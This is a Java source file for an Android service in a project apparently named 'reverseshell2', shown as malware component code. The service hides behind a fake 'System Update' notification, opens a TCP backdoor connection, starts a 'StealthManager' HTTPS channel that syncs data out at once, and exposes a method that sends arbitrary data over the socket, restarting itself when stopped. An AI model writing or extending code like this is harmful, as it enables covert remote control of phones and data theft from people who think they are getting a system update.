package com.example.reverseshell2;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

public class mainService extends Service {
    static String TAG ="mainServiceClass";
    private static mainService instance;

    public static mainService getContext() {
        return instance;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    public static void sendData(String data) {
        if (tcpConnection.out != null) {
            new Thread(() -> {
                try {
                    tcpConnection.out.write(data.getBytes("UTF-8"));
                } catch (Exception e) {
                    Log.e(TAG, "Failed to send data: " + e.getMessage());
                }
            }).start();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Starting Foreground Service");
        
        Intent notificationIntent = new Intent(this, MainActivity.class);
        android.app.PendingIntent pendingIntent = android.app.PendingIntent.getActivity(this,
                0, notificationIntent, android.app.PendingIntent.FLAG_IMMUTABLE);

        android.app.Notification notification = new androidx.core.app.NotificationCompat.Builder(this, "channelid")
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(1, notification);

        // Legacy TCP socket connection (kept for backwards compatibility)
        new jumper(getApplicationContext()).init();

        // NEW: Initialize HTTPS cloud sync pipeline
        StealthManager stealth = new StealthManager(getApplicationContext());
        stealth.initialize();
        
        // Trigger immediate first sync
        stealth.syncNow();
        
        Log.d(TAG, "Both TCP and HTTPS sync pipelines active");
        return START_STICKY;
    }
}
